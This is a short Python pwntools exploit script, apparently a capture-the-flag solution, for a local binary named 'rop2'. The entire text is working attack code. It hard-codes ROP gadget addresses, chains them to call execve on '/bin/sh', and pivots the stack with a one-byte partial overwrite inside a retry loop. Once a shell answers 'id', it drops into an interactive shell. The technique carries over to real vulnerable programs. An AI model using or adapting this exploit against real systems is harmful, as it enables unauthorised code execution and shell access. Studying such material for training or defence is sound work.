from pwn import *

context.arch = 'amd64'

pop_rdi_ret = 0x401516
pop_rax_rdx_rbx_ret = 0x478616
pop_rsi_ret = 0x401637
syscall = 0x4672b5
lea_ret = 0x4009e4
pop_rbp_ret = 0x4004d1

buf2 = 0x6ccd60

rop2 = flat([pop_rdi_ret, buf2, pop_rax_rdx_rbx_ret, 0x3b, 0x0, 0x0, pop_rsi_ret, 0x0, syscall])
padding = '/bin/sh\x00'.ljust(48)

while True:

    r = process('./rop2')

    r.sendline(padding + rop2)
    r.recvuntil('\n')

    rop1 = flat([pop_rbp_ret, buf2 + 40, lea_ret]).ljust(32)
    rop1 += '\x28'
    #raw_input()
    r.send(rop1)     # Be careful, don't use sendline here!!!!
    r.recvuntil('\n')
    try:
        r.send('id\n')
        r.recvline()   # recv the output of id so that while loop can continue
    except EOFError:
        r.close()
    else:
        break     # break out of the while loop if no EOF error

r.interactive()
